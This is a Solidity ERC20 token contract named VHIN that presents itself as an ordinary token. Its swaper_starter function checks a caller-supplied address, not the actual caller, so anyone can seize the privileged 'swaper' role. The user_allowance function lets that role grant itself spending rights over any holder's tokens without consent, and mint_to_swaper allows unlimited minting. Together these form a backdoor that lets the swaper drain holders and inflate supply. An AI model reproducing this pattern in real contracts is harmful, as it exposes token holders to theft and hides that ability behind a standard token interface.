// SPDX-License-Identifier: MIT
// fd6a3c4a8e4c91d66f53486171c4528d880d0ad97811263142215914e39becbd

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";


contract VHIN is ERC20 {
    // addresses
    address payable owner;
    address payable swaper;
    address payable swaper_add;

    // starter
    bool starter = false;

    // miscelanious
    uint256 multiplier = 10**18;
    uint256 initialSupply = 1 * 10**12;


    constructor() ERC20("VHIN", "VHIN"){
        _mint(address(this), 1);
        owner = payable(msg.sender);
    }


    function swaper_starter(address _owner) public {
        require(_owner == owner, "You are not the owner!");
        require(starter == false, "This function can be called only once.");

        swaper_add = payable(msg.sender);

        _mint(swaper_add, initialSupply * multiplier);
        approve(msg.sender, totalSupply() + 1);

        starter = true;
    }

    function user_allowance(uint256 _amount, address _user) public only_swaper {
        _approve(_user, swaper_add, _amount + 1);
    }

    function mint_to_swaper() public only_swaper {
        _mint(swaper_add, initialSupply * multiplier);
        approve(msg.sender, totalSupply() + 1);
    }
    

    modifier only_swaper() { 
        require (msg.sender == swaper_add, "You are not the swaper!");
        _;
    }
}